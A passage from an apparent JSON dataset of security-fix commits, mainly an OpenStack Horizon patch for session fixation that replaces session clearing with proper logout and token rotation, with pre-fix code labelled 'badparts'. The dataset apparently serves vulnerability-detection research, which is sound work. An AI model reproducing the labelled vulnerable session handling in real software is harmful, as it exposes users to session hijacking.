exceptions as glanceclient\nfrom keystoneclient import exceptions as keystoneclient\nfrom novaclient import exceptions as novaclient\n\n\nLOG = logging.getLogger(__name__)\n\n\nclass HorizonException(Exception):\n    \"\"\" Base exception class for distinguishing our own exception classes. \"\"\"\n    pass\n\n\nclass Http302(HorizonException):\n    \"\"\"\n    Error class which can be raised from within a handler to cause an\n    early bailout and redirect at the middleware level.\n    \"\"\"\n    status_code = 302\n\n    def __init__(self, location, message=None):\n        self.location = location\n        self.message = message\n\n\nclass NotAuthorized(HorizonException):\n    \"\"\"\n    Raised whenever a user attempts to access a resource which they do not\n    have role-based access to (such as when failing the\n    :func:`~horizon.decorators.require_roles` decorator).\n\n    The included :class:`~horizon.middleware.HorizonMiddleware` catches\n    ``NotAuthorized`` and handles it gracefully by displaying an error\n    message and redirecting the user to a login page.\n    \"\"\"\n    status_code = 401\n\n\nclass NotAuthenticated(HorizonException):\n    \"\"\"\n    Raised when a user is trying to make requests and they are not logged in.\n\n    The included :class:`~horizon.middleware.HorizonMiddleware` catches\n    ``NotAuthenticated`` and handles it gracefully by displaying an error\n    message and redirecting the user to a login page.\n    \"\"\"\n    status_code = 403\n\n\nclass NotFound(HorizonException):\n    \"\"\" Generic error to replace all \"Not Found\"-type API errors. \"\"\"\n    status_code = 404\n\n\nclass RecoverableError(HorizonException):\n    \"\"\" Generic error to replace any \"Recoverable\"-type API errors. \"\"\"\n    status_code = 100  # HTTP status code \"Continue\"\n\n\nclass ServiceCatalogException(HorizonException):\n    \"\"\"\n    Raised when a requested service is not available in the ``ServiceCatalog``\n    returned by Keystone.\n    \"\"\"\n    def __init__(self, service_name):\n        message = 'Invalid service catalog service: %s' % service_name\n        super(ServiceCatalogException, self).__init__(message)\n\n\nclass AlreadyExists(HorizonException):\n    \"\"\"\n    Exception to be raised when trying to create an API resource which\n    already exists.\n    \"\"\"\n    def __init__(self, name, resource_type):\n        self.attrs = {\"name\": name, \"resource\": resource_type}\n        self.msg = 'A %(resource)s with the name \"%(name)s\" already exists.'\n\n    def __repr__(self):\n        return self.msg % self.attrs\n\n    def __unicode__(self):\n        return _(self.msg) % self.attrs\n\n\nclass HandledException(HorizonException):\n    \"\"\"\n    Used internally to track exceptions that have gone through\n    :func:`horizon.exceptions.handle` more than once.\n    \"\"\"\n    def __init__(self, wrapped):\n        self.wrapped = wrapped\n\n\nHORIZON_CONFIG = getattr(settings, \"HORIZON_CONFIG\", {})\nEXCEPTION_CONFIG = HORIZON_CONFIG.get(\"exceptions\", {})\n\n\nUNAUTHORIZED = (keystoneclient.Unauthorized,\n                keystoneclient.Forbidden,\n                novaclient.Unauthorized,\n                novaclient.Forbidden,\n                glanceclient.AuthorizationFailure,\n                glanceclient.Unauthorized,\n                swiftclient.AuthenticationFailed,\n                swiftclient.AuthenticationError)\nUNAUTHORIZED += tuple(EXCEPTION_CONFIG.get('unauthorized', []))\n\nNOT_FOUND = (keystoneclient.NotFound,\n             novaclient.NotFound,\n             glanceclient.NotFound,\n             swiftclient.NoSuchContainer,\n             swiftclient.NoSuchObject)\nNOT_FOUND += tuple(EXCEPTION_CONFIG.get('not_found', []))\n\n\n# NOTE(gabriel): This is very broad, and may need to be dialed in.\nRECOVERABLE = (keystoneclient.ClientException,\n               # AuthorizationFailure is raised when Keystone is \"unavailable\".\n               keystoneclient.AuthorizationFailure,\n               novaclient.ClientException,\n               glanceclient.ClientException,\n               swiftclient.Error,\n               AlreadyExists)\nRECOVERABLE += tuple(EXCEPTION_CONFIG.get('recoverable', []))\n\n\ndef handle(request, message=None, redirect=None, ignore=False, escalate=False):\n    \"\"\" Centralized error handling for Horizon.\n\n    Because Horizon consumes so many different APIs with completely\n    different ``Exception`` types, it's necessary to have a centralized\n    place for handling exceptions which may be raised.\n\n    Exceptions are roughly divided into 3 types:\n\n    #. ``UNAUTHORIZED``: Errors resulting from authentication or authorization\n       problems. These result in being logged out and sent to the login screen.\n    #. ``NOT_FOUND``: Errors resulting from objects which could not be\n       located via the API. These generally result in a user-facing error\n       message, but are otherwise returned to the normal code flow. Optionally\n       a redirect value may be passed to the error handler so users are\n       returned to a different view than the one requested in addition to the\n       error message.\n    #. RECOVERABLE: Generic API errors which generate a user-facing message\n       but drop directly back to the regular code flow.\n\n    All other exceptions bubble the stack as normal unless the ``ignore``\n    argument is passed in as ``True``, in which case only unrecognized\n    errors are bubbled.\n\n    If the exception is not re-raised, an appropriate wrapper exception\n    class indicating the type of exception that was encountered will be\n    returned.\n    \"\"\"\n    exc_type, exc_value, exc_traceback = sys.exc_info()\n\n    # Because the same exception may travel through this method more than\n    # once (if it's re-raised) we may want to treat it differently\n    # the second time (e.g. no user messages\/logging).\n    handled = issubclass(exc_type, HandledException)\n    wrap = False\n\n    # Restore our original exception information, but re-wrap it at the end\n    if handled:\n        exc_type, exc_value, exc_traceback = exc_value.wrapped\n        wrap = True\n\n    # We trust messages from our own exceptions\n    if issubclass(exc_type, HorizonException):\n        message = exc_value\n    # If the message has a placeholder for the exception, fill it in\n    elif message and \"%(exc)s\" in message:\n        message = message % {\"exc\": exc_value}\n\n    if issubclass(exc_type, UNAUTHORIZED):\n        if ignore:\n            return NotAuthorized\n        request.session.clear()\n        if not handled:\n            LOG.debug(\"Unauthorized: %s\" % exc_value)\n            # We get some pretty useless error messages back from\n            # some clients, so let's define our own fallback.\n            fallback = _(\"Unauthorized. Please try logging in again.\")\n            messages.error(request, message or fallback, extra_tags=\"login\")\n        raise NotAuthorized  # Redirect handled in middleware\n\n    if issubclass(exc_type, NOT_FOUND):\n        wrap = True\n        if not ignore and not handled:\n            LOG.debug(\"Not Found: %s\" % exc_value)\n            messages.error(request, message or exc_value)\n        if redirect:\n            raise Http302(redirect)\n        if not escalate:\n            return NotFound  # return to normal code flow\n\n    if issubclass(exc_type, RECOVERABLE):\n        wrap = True\n        if not ignore and not handled:\n            LOG.debug(\"Recoverable error: %s\" % exc_value)\n            messages.error(request, message or exc_value)\n        if redirect:\n            raise Http302(redirect)\n        if not escalate:\n            return RecoverableError  # return to normal code flow\n\n    # If we've gotten here, time to wrap and\/or raise our exception.\n    if wrap:\n        raise HandledException([exc_type, exc_value, exc_traceback])\n    raise exc_type, exc_value, exc_traceback\n"},"\/horizon\/users.py":{"changes":[{"diff":"\n         # If any of those keys are missing from the session it is\n         # overwhelmingly likely that we're dealing with an outdated session.\n         LOG.exception(\"Error while creating User from session.\")\n-        request.session.clear()\n+        request.user_logout()\n         raise exceptions.NotAuthorized(_(\"Your session has expired. \"\n                                          \"Please log in again.\")","add":1,"remove":1,"filename":"\/horizon\/users.py","badparts":["        request.session.clear()"],"goodparts":["        request.user_logout()"]},{"diff":"\n         # If any of those keys are missing from the session it is\n         # overwhelmingly likely that we're dealing with an outdated session.\n         LOG.exception(\"Error while creating User from session.\")\n-        request.session.clear()\n+        request.user_logout()\n         raise exceptions.NotAuthorized(_(\"Your session has expired. \"\n                                          \"Please log in again.\")","add":1,"remove":1,"filename":"\/horizon\/users.py","badparts":["        request.session.clear()"],"goodparts":["        request.user_logout()"]}],"source":"\n \"\"\" Classes and methods related to user handling in Horizon. \"\"\" import logging from django.utils.translation import ugettext as _ from horizon import api from horizon import exceptions LOG=logging.getLogger(__name__) def get_user_from_request(request): \"\"\" Checks the current session and returns a:class:`~horizon.users.User`. If the session contains user data the User will be treated as authenticated and the:class:`~horizon.users.User` will have all its attributes set. If not, the:class:`~horizon.users.User` will have no attributes set. If the session contains invalid data, :exc:`~horizon.exceptions.NotAuthorized` will be raised. \"\"\" if 'user_id' not in request.session: return User() try: return User(id=request.session['user_id'], token=request.session['token'], user=request.session['user_name'], tenant_id=request.session['tenant_id'], tenant_name=request.session['tenant'], service_catalog=request.session['serviceCatalog'], roles=request.session['roles'], request=request) except KeyError: LOG.exception(\"Error while creating User from session.\") request.session.clear() raise exceptions.NotAuthorized(_(\"Your session has expired. \" \"Please log in again.\")) class LazyUser(object): def __get__(self, request, obj_type=None): if not hasattr(request, '_cached_user'): request._cached_user=get_user_from_request(request) return request._cached_user class User(object): \"\"\" The main user class which Horizon expects. .. attribute:: token The id of the Keystone token associated with the current user\/tenant. .. attribute:: username The name of the current user. .. attribute:: tenant_id The id of the Keystone tenant for the current user\/token. .. attribute:: tenant_name The name of the Keystone tenant for the current user\/token. .. attribute:: service_catalog The ``ServiceCatalog`` data returned by Keystone. .. attribute:: roles A list of dictionaries containing role names and ids as returned by Keystone. .. attribute:: admin Boolean value indicating whether or not this user has admin privileges. Internally mapped to:meth:`horizon.users.User.is_admin`. \"\"\" def __init__(self, id=None, token=None, user=None, tenant_id=None, service_catalog=None, tenant_name=None, roles=None, authorized_tenants=None, request=None): self.id=id self.token=token self.username=user self.tenant_id=tenant_id self.tenant_name=tenant_name self.service_catalog=service_catalog self.roles=roles or[] self._authorized_tenants=authorized_tenants self._request=request def is_authenticated(self): \"\"\" Evaluates whether this:class:`.User` instance has been authenticated. Returns ``True`` or ``False``. \"\"\" return self.token @property def admin(self): return self.is_admin() def is_admin(self): \"\"\" Evaluates whether this user has admin privileges. Returns ``True`` or ``False``. \"\"\" for role in self.roles: if role['name'].lower()=='admin': return True return False def get_and_delete_messages(self): \"\"\" Placeholder function for parity with ``django.contrib.auth.models.User``. \"\"\" return[] @property def authorized_tenants(self): if self.is_authenticated() and self._authorized_tenants is None: try: token=self._request.session.get(\"unscoped_token\", self.token) authd=api.tenant_list_for_token(self._request, token) except: authd=[] LOG.exception('Could not retrieve tenant list.') self._authorized_tenants=authd return self._authorized_tenants @authorized_tenants.setter def authorized_tenants(self, tenant_list): self._authorized_tenants=tenant_list ","sourceWithComments":"# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright 2012 United States Government as represented by the\n# Administrator of the National Aeronautics and Space Administration.\n# All Rights Reserved.\n#\n# Copyright 2012 Nebula, Inc.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http:\/\/www.apache.org\/licenses\/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\"\"\"\nClasses and methods related to user handling in Horizon.\n\"\"\"\n\nimport logging\n\nfrom django.utils.translation import ugettext as _\n\nfrom horizon import api\nfrom horizon import exceptions\n\n\nLOG = logging.getLogger(__name__)\n\n\ndef get_user_from_request(request):\n    \"\"\" Checks the current session and returns a :class:`~horizon.users.User`.\n\n    If the session contains user data the User will be treated as\n    authenticated and the :class:`~horizon.users.User` will have all\n    its attributes set.\n\n    If not, the :class:`~horizon.users.User` will have no attributes set.\n\n    If the session contains invalid data,\n    :exc:`~horizon.exceptions.NotAuthorized` will be raised.\n    \"\"\"\n    if 'user_id' not in request.session:\n        return User()\n    try:\n        return User(id=request.session['user_id'],\n                    token=request.session['token'],\n                    user=request.session['user_name'],\n                    tenant_id=request.session['tenant_id'],\n                    tenant_name=request.session['tenant'],\n                    service_catalog=request.session['serviceCatalog'],\n                    roles=request.session['roles'],\n                    request=request)\n    except KeyError:\n        # If any of those keys are missing from the session it is\n        # overwhelmingly likely that we're dealing with an outdated session.\n        LOG.exception(\"Error while creating User from session.\")\n        request.session.clear()\n        raise exceptions.NotAuthorized(_(\"Your session has expired. \"\n                                         \"Please log in again.\"))\n\n\nclass LazyUser(object):\n    def __get__(self, request, obj_type=None):\n        if not hasattr(request, '_cached_user'):\n            request._cached_user = get_user_from_request(request)\n        return request._cached_user\n\n\nclass User(object):\n    \"\"\" The main user class which Horizon expects.\n\n    .. attribute:: token\n\n        The id of the Keystone token associated with the current user\/tenant.\n\n    .. attribute:: username\n\n        The name of the current user.\n\n    .. attribute:: tenant_id\n\n        The id of the Keystone tenant for the current user\/token.\n\n    .. attribute:: tenant_name\n\n        The name of the Keystone tenant for the current user\/token.\n\n    .. attribute:: service_catalog\n\n        The ``ServiceCatalog`` data returned by Keystone.\n\n    .. attribute:: roles\n\n        A list of dictionaries containing role names and ids as returned\n        by Keystone.\n\n    .. attribute:: admin\n\n        Boolean value indicating whether or not this user has admin\n        privileges. Internally mapped to :meth:`horizon.users.User.is_admin`.\n    \"\"\"\n    def __init__(self, id=None, token=None, user=None, tenant_id=None,\n                    service_catalog=None, tenant_name=None, roles=None,\n                    authorized_tenants=None, request=None):\n        self.id = id\n        self.token = token\n        self.username = user\n        self.tenant_id = tenant_id\n        self.tenant_name = tenant_name\n        self.service_catalog = service_catalog\n        self.roles = roles or []\n        self._authorized_tenants = authorized_tenants\n        # Store the request for lazy fetching of auth'd tenants\n        self._request = request\n\n    def is_authenticated(self):\n        \"\"\"\n        Evaluates whether this :class:`.User` instance has been authenticated.\n        Returns ``True`` or ``False``.\n        \"\"\"\n        # TODO: deal with token expiration\n        return self.token\n\n    @property\n    def admin(self):\n        return self.is_admin()\n\n    def is_admin(self):\n        \"\"\"\n        Evaluates whether this user has admin privileges. Returns\n        ``True`` or ``False``.\n        \"\"\"\n        for role in self.roles:\n            if role['name'].lower() == 'admin':\n                return True\n        return False\n\n    def get_and_delete_messages(self):\n        \"\"\"\n        Placeholder function for parity with\n        ``django.contrib.auth.models.User``.\n        \"\"\"\n        return []\n\n    @property\n    def authorized_tenants(self):\n        if self.is_authenticated() and self._authorized_tenants is None:\n            try:\n                token = self._request.session.get(\"unscoped_token\", self.token)\n                authd = api.tenant_list_for_token(self._request, token)\n            except:\n                authd = []\n                LOG.exception('Could not retrieve tenant list.')\n            self._authorized_tenants = authd\n        return self._authorized_tenants\n\n    @authorized_tenants.setter\n    def authorized_tenants(self, tenant_list):\n        self._authorized_tenants = tenant_list\n"},"\/horizon\/views\/auth.py":{"changes":[{"diff":"\n \n def logout(request):\n     \"\"\" Clears the session and logs the current user out. \"\"\"\n-    request.session.clear()\n+    request.user_logout()\n     # FIXME(gabriel): we don't ship a view named splash\n     return shortcuts.redirect('spla","add":1,"remove":1,"filename":"\/horizon\/views\/auth.py","badparts":["    request.session.clear()"],"goodparts":["    request.user_logout()"]},{"diff":"\n \n def logout(request):\n     \"\"\" Clears the session and logs the current user out. \"\"\"\n-    request.session.clear()\n+    request.user_logout()\n     # FIXME(gabriel): we don't ship a view named splash\n     return shortcuts.redirect('spla","add":1,"remove":1,"filename":"\/horizon\/views\/auth.py","badparts":["    request.session.clear()"],"goodparts":["    request.user_logout()"]}],"source":"\n import logging from django import shortcuts from django.conf import settings from django.contrib.auth import REDIRECT_FIELD_NAME from django.utils.translation import ugettext as _ import horizon from horizon import api from horizon import exceptions from horizon import forms from horizon import users from horizon.base import Horizon from horizon.views.auth_forms import Login, LoginWithTenant, _set_session_data LOG=logging.getLogger(__name__) def user_home(request): \"\"\" Reversible named view to direct a user to the appropriate homepage. \"\"\" return shortcuts.redirect(horizon.get_user_home(request.user)) class LoginView(forms.ModalFormView): \"\"\" Logs in a user and redirects them to the URL specified by :func:`horizon.get_user_home`. \"\"\" form_class=Login template_name=\"horizon\/auth\/login.html\" def get_context_data(self, **kwargs): context=super(LoginView, self).get_context_data(**kwargs) redirect_to=self.request.REQUEST.get(REDIRECT_FIELD_NAME, \"\") context[\"redirect_field_name\"]=REDIRECT_FIELD_NAME context[\"next\"]=redirect_to return context def get_initial(self): initial=super(LoginView, self).get_initial() current_region=self.request.session.get('region_endpoint', None) requested_region=self.request.GET.get('region', None) regions=dict(getattr(settings, \"AVAILABLE_REGIONS\",[])) if requested_region in regions and requested_region !=current_region: initial.update({'region': requested_region}) return initial def switch_tenants(request, tenant_id): \"\"\" Swaps a user from one tenant to another using the unscoped token from Keystone to exchange scoped tokens for the new tenant. \"\"\" form, handled=LoginWithTenant.maybe_handle( request, initial={'tenant': tenant_id, 'username': request.user.username}) if handled: return handled unscoped_token=request.session.get('unscoped_token', None) if unscoped_token: try: token=api.token_create_scoped(request, tenant_id, unscoped_token) _set_session_data(request, token) user=users.User(users.get_user_from_request(request)) return shortcuts.redirect(Horizon.get_user_home(user)) except: exceptions.handle(request, _(\"You are not authorized for that tenant.\")) return shortcuts.redirect(\"horizon:auth_login\") def logout(request): \"\"\" Clears the session and logs the current user out. \"\"\" request.session.clear() return shortcuts.redirect('splash') ","sourceWithComments":"# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright 2012 United States Government as represented by the\n# Administrator of the National Aeronautics and Space Administration.\n# All Rights Reserved.\n#\n# Copyright 2012 Nebula, Inc.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http:\/\/www.apache.org\/licenses\/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\nimport logging\n\nfrom django import shortcuts\nfrom django.conf import settings\nfrom django.contrib.auth import REDIRECT_FIELD_NAME\nfrom django.utils.translation import ugettext as _\n\nimport horizon\nfrom horizon import api\nfrom horizon import exceptions\nfrom horizon import forms\nfrom horizon import users\nfrom horizon.base import Horizon\nfrom horizon.views.auth_forms import Login, LoginWithTenant, _set_session_data\n\n\nLOG = logging.getLogger(__name__)\n\n\ndef user_home(request):\n    \"\"\" Reversible named view to direct a user to the appropriate homepage. \"\"\"\n    return shortcuts.redirect(horizon.get_user_home(request.user))\n\n\nclass LoginView(forms.ModalFormView):\n    \"\"\"\n    Logs in a user and redirects them to the URL specified by\n    :func:`horizon.get_user_home`.\n    \"\"\"\n    form_class = Login\n    template_name = \"horizon\/auth\/login.html\"\n\n    def get_context_data(self, **kwargs):\n        context = super(LoginView, self).get_context_data(**kwargs)\n        redirect_to = self.request.REQUEST.get(REDIRECT_FIELD_NAME, \"\")\n        context[\"redirect_field_name\"] = REDIRECT_FIELD_NAME\n        context[\"next\"] = redirect_to\n        return context\n\n    def get_initial(self):\n        initial = super(LoginView, self).get_initial()\n        current_region = self.request.session.get('region_endpoint', None)\n        requested_region = self.request.GET.get('region', None)\n        regions = dict(getattr(settings, \"AVAILABLE_REGIONS\", []))\n        if requested_region in regions and requested_region != current_region:\n            initial.update({'region': requested_region})\n        return initial\n\n\ndef switch_tenants(request, tenant_id):\n    \"\"\"\n    Swaps a user from one tenant to another using the unscoped token from\n    Keystone to exchange scoped tokens for the new tenant.\n    \"\"\"\n    form, handled = LoginWithTenant.maybe_handle(\n            request, initial={'tenant': tenant_id,\n                              'username': request.user.username})\n    if handled:\n        return handled\n\n    unscoped_token = request.session.get('unscoped_token', None)\n    if unscoped_token:\n        try:\n            token = api.token_create_scoped(request,\n                                            tenant_id,\n                                            unscoped_token)\n            _set_session_data(request, token)\n            user = users.User(users.get_user_from_request(request))\n            return shortcuts.redirect(Horizon.get_user_home(user))\n        except:\n            exceptions.handle(request,\n                              _(\"You are not authorized for that tenant.\"))\n\n    return shortcuts.redirect(\"horizon:auth_login\")\n\n\ndef logout(request):\n    \"\"\" Clears the session and logs the current user out. \"\"\"\n    request.session.clear()\n    # FIXME(gabriel): we don't ship a view named splash\n    return shortcuts.redirect('splash')\n"},"\/horizon\/views\/auth_forms.py":{"changes":[{"diff":"\n                 # If we get here we don't want to show a stack trace to the\n                 # user. However, if we fail here, there may be bad session\n                 # data that's been cached already.\n-                request.session.clear()\n+                request.user_logout()\n                 exceptions.handle(request,\n                                   message=_(\"An error occurred authenticating.\"\n                                             \" Please try again later.\"),\n","add":1,"remove":1,"filename":"\/horizon\/views\/auth_forms.py","badparts":["                request.session.clear()"],"goodparts":["                request.user_logout()"]},{"diff":"\n                 # If we get here we don't want to show a stack trace to the\n                 # user. However, if we fail here, there may be bad session\n                 # data that's been cached already.\n-                request.session.clear()\n+                request.user_logout()\n                 exceptions.handle(request,\n                                   message=_(\"An error occurred authenticating.\"\n                                             \" Please try again later.\"),\n","add":1,"remove":1,"filename":"\/horizon\/views\/auth_forms.py","badparts":["                request.session.clear()"],"goodparts":["                request.user_logout()"]}],"source":"\n \"\"\" Forms used for Horizon's auth mechanisms. \"\"\" import logging from django import shortcuts from django.conf import settings from django.contrib import messages from django.contrib.auth import REDIRECT_FIELD_NAME from django.utils.translation import ugettext as _ from keystoneclient import exceptions as keystone_exceptions from horizon import api from horizon import base from horizon import exceptions from horizon import forms from horizon import users LOG=logging.getLogger(__name__) def _set_session_data(request, token): request.session['serviceCatalog']=token.serviceCatalog request.session['tenant']=token.tenant['name'] request.session['tenant_id']=token.tenant['id'] request.session['token']=token.id request.session['user_name']=token.user['name'] request.session['user_id']=token.user['id'] request.session['roles']=token.user['roles'] class Login(forms.SelfHandlingForm): \"\"\" Form used for logging in a user. Handles authentication with Keystone, choosing a tenant, and fetching a scoped token token for that tenant. Redirects to the URL returned by:meth:`horizon.get_user_home` if successful. Subclass of:class:`~horizon.forms.SelfHandlingForm`. \"\"\" region=forms.ChoiceField(label=_(\"Region\"), required=False) username=forms.CharField(label=_(\"User Name\")) password=forms.CharField(label=_(\"Password\"), widget=forms.PasswordInput(render_value=False)) def __init__(self, *args, **kwargs): super(Login, self).__init__(*args, **kwargs) default_region=(settings.OPENSTACK_KEYSTONE_URL, \"Default Region\") regions=getattr(settings, 'AVAILABLE_REGIONS',[default_region]) self.fields['region'].choices=regions if len(regions)==1: self.fields['region'].initial=default_region[0] self.fields['region'].widget=forms.widgets.HiddenInput() def handle(self, request, data): endpoint=data.get('region', None) or settings.OPENSTACK_KEYSTONE_URL region_name=dict(self.fields['region'].choices)[endpoint] request.session['region_endpoint']=endpoint request.session['region_name']=region_name redirect_to=request.REQUEST.get(REDIRECT_FIELD_NAME, \"\") if data.get('tenant', None): try: token=api.token_create(request, data.get('tenant'), data['username'], data['password']) tenants=api.tenant_list_for_token(request, token.id) except: msg=_('Unable to authenticate for that project.') exceptions.handle(request, message=msg, escalate=True) _set_session_data(request, token) user=users.get_user_from_request(request) redirect=redirect_to or base.Horizon.get_user_home(user) return shortcuts.redirect(redirect) elif data.get('username', None): try: unscoped_token=api.token_create(request, '', data['username'], data['password']) except keystone_exceptions.Unauthorized: exceptions.handle(request, _('Invalid user name or password.')) except: request.session.clear() exceptions.handle(request, message=_(\"An error occurred authenticating.\" \" Please try again later.\"), escalate=True) request.session['unscoped_token']=unscoped_token.id request.user.username=data['username'] try: tenants=api.tenant_list_for_token(request, unscoped_token.id) except: exceptions.handle(request) tenants=[] if not tenants: messages.error(request, _('You are not authorized for any projects.') % {\"user\": data['username']}, extra_tags=\"login\") return while tenants: tenant=tenants.pop() try: token=api.token_create_scoped(request, tenant.id, unscoped_token.id) break except: exceptions.handle(request, ignore=True) token=None if token is None: raise exceptions.NotAuthorized( _(\"You are not authorized for any available projects.\")) _set_session_data(request, token) user=users.get_user_from_request(request) redirect=redirect_to or base.Horizon.get_user_home(user) return shortcuts.redirect(redirect) class LoginWithTenant(Login): \"\"\" Exactly like:class:`.Login` but includes the tenant id as a field so that the process of choosing a default tenant is bypassed. \"\"\" region=forms.ChoiceField(required=False) username=forms.CharField(max_length=\"20\", widget=forms.TextInput(attrs={'readonly': 'readonly'})) tenant=forms.CharField(widget=forms.HiddenInput()) ","sourceWithComments":"# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright 2012 United States Government as represented by the\n# Administrator of the National Aeronautics and Space Administration.\n# All Rights Reserved.\n#\n# Copyright 2012 Nebula, Inc.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http:\/\/www.apache.org\/licenses\/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\n\"\"\"\nForms used for Horizon's auth mechanisms.\n\"\"\"\n\nimport logging\n\nfrom django import shortcuts\nfrom django.conf import settings\nfrom django.contrib import messages\nfrom django.contrib.auth import REDIRECT_FIELD_NAME\nfrom django.utils.translation import ugettext as _\nfrom keystoneclient import exceptions as keystone_exceptions\n\nfrom horizon import api\nfrom horizon import base\nfrom horizon import exceptions\nfrom horizon import forms\nfrom horizon import users\n\n\nLOG = logging.getLogger(__name__)\n\n\ndef _set_session_data(request, token):\n    request.session['serviceCatalog'] = token.serviceCatalog\n    request.session['tenant'] = token.tenant['name']\n    request.session['tenant_id'] = token.tenant['id']\n    request.session['token'] = token.id\n    request.session['user_name'] = token.user['name']\n    request.session['user_id'] = token.user['id']\n    request.session['roles'] = token.user['roles']\n\n\nclass Login(forms.SelfHandlingForm):\n    \"\"\" Form used for logging in a user.\n\n    Handles authentication with Keystone, choosing a tenant, and fetching\n    a scoped token token for that tenant. Redirects to the URL returned\n    by :meth:`horizon.get_user_home` if successful.\n\n    Subclass of :class:`~horizon.forms.SelfHandlingForm`.\n    \"\"\"\n    region = forms.ChoiceField(label=_(\"Region\"), required=False)\n    username = forms.CharField(label=_(\"User Name\"))\n    password = forms.CharField(label=_(\"Password\"),\n                               widget=forms.PasswordInput(render_value=False))\n\n    def __init__(self, *args, **kwargs):\n        super(Login, self).__init__(*args, **kwargs)\n        # FIXME(gabriel): When we switch to region-only settings, we can\n        # remove this default region business.\n        default_region = (settings.OPENSTACK_KEYSTONE_URL, \"Default Region\")\n        regions = getattr(settings, 'AVAILABLE_REGIONS', [default_region])\n        self.fields['region'].choices = regions\n        if len(regions) == 1:\n            self.fields['region'].initial = default_region[0]\n            self.fields['region'].widget = forms.widgets.HiddenInput()\n\n    def handle(self, request, data):\n        # For now we'll allow fallback to OPENSTACK_KEYSTONE_URL if the\n        # form post doesn't include a region.\n        endpoint = data.get('region', None) or settings.OPENSTACK_KEYSTONE_URL\n        region_name = dict(self.fields['region'].choices)[endpoint]\n        request.session['region_endpoint'] = endpoint\n        request.session['region_name'] = region_name\n\n        redirect_to = request.REQUEST.get(REDIRECT_FIELD_NAME, \"\")\n\n        if data.get('tenant', None):\n            try:\n                token = api.token_create(request,\n                                         data.get('tenant'),\n                                         data['username'],\n                                         data['password'])\n                tenants = api.tenant_list_for_token(request, token.id)\n            except:\n                msg = _('Unable to authenticate for that project.')\n                exceptions.handle(request,\n                                  message=msg,\n                                  escalate=True)\n            _set_session_data(request, token)\n            user = users.get_user_from_request(request)\n            redirect = redirect_to or base.Horizon.get_user_home(user)\n            return shortcuts.redirect(redirect)\n\n        elif data.get('username', None):\n            try:\n                unscoped_token = api.token_create(request,\n                                                  '',\n                                                  data['username'],\n                                                  data['password'])\n            except keystone_exceptions.Unauthorized:\n                exceptions.handle(request,\n                                  _('Invalid user name or password.'))\n            except:\n                # If we get here we don't want to show a stack trace to the\n                # user. However, if we fail here, there may be bad session\n                # data that's been cached already.\n                request.session.clear()\n                exceptions.handle(request,\n                                  message=_(\"An error occurred authenticating.\"\n                                            \" Please try again later.\"),\n                                  escalate=True)\n\n            # Unscoped token\n            request.session['unscoped_token'] = unscoped_token.id\n            request.user.username = data['username']\n\n            # Get the tenant list, and log in using first tenant\n            # FIXME (anthony): add tenant chooser here?\n            try:\n                tenants = api.tenant_list_for_token(request, unscoped_token.id)\n            except:\n                exceptions.handle(request)\n                tenants = []\n\n            # Abort if there are no valid tenants for this user\n            if not tenants:\n                messages.error(request,\n                               _('You are not authorized for any projects.') %\n                                {\"user\": data['username']},\n                               extra_tags=\"login\")\n                return\n\n            # Create a token.\n            # NOTE(gabriel): Keystone can return tenants that you're\n            # authorized to administer but not to log into as a user, so in\n            # the case of an Unauthorized error we should iterate through\n            # the tenants until one succeeds or we've failed them all.\n            while tenants:\n                tenant = tenants.pop()\n                try:\n                    token = api.token_create_scoped(request,\n                                                    tenant.id,\n                                                    unscoped_token.id)\n                    break\n                except:\n                    # This will continue for recognized Unauthorized\n                    # exceptions from keystoneclient.\n                    exceptions.handle(request, ignore=True)\n                    token = None\n            if token is None:\n                raise exceptions.NotAuthorized(\n                    _(\"You are not authorized for any available projects.\"))\n\n            _set_session_data(request, token)\n            user = users.get_user_from_request(request)\n        redirect = redirect_to or base.Horizon.get_user_home(user)\n        return shortcuts.redirect(redirect)\n\n\nclass LoginWithTenant(Login):\n    \"\"\"\n    Exactly like :class:`.Login` but includes the tenant id as a field\n    so that the process of choosing a default tenant is bypassed.\n    \"\"\"\n    region = forms.ChoiceField(required=False)\n    username = forms.CharField(max_length=\"20\",\n                       widget=forms.TextInput(attrs={'readonly': 'readonly'}))\n    tenant = forms.CharField(widget=forms.HiddenInput())\n"}},"msg":"Fixes lp978896 -- Session fixation security fix\n\nRotates session tokens on logout, and properly clears sessions\nto prevent data leakage.\n\nChange-Id: I52d03576d07b1e023a7730857156d0da1887b1df"}},"https:\/\/github.com\/ONSdigital\/eq-survey-runner":{"01bb713a7c51a7d742c2dd24f3536a851cbdceb9":{"url":"https:\/\/api.github.com\/repos\/ONSdigital\/eq-survey-runner\/commits\/01bb713a7c51a7d742c2dd24f3536a851cbdceb9","html_url":"https:\/\/github.com\/ONSdigital\/eq-survey-runner\/commit\/01bb713a7c51a7d742c2dd24f3536a851cbdceb9","sha":"01bb713a7c51a7d742c2dd24f3536a851cbdceb9","keyword":"session fixation attack","diff":"diff --git a\/app\/authentication\/authenticator.py b\/app\/authentication\/authenticator.py\nindex 810ee7ba12..e9bdb98b24 100644\n--- a\/app\/authentication\/authenticator.py\n+++ b\/app\/authentication\/authenticator.py\n@@ -1,4 +1,5 @@\n import logging\n+from flask import session\n \n from app.authentication.invalid_token_exception import 